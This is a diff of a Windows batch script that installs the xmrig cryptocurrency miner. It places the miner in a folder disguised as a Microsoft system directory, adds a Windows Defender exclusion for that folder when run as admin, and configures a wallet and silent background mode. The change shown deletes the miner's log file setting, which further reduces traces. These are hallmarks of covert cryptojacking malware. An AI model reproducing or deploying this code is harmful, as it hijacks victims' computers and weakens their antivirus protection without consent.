@@ -72,7 +72,6 @@ set PORT=10001
 :PORT_OK
 
 set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"
-set "LOGFILE=%MINER_DIR%\xmrig.log"
 
 if %ADMIN% == 1 (
   powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
@@ -189,9 +188,6 @@ powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"ur
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-
 copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL
 powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'"
 powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'"
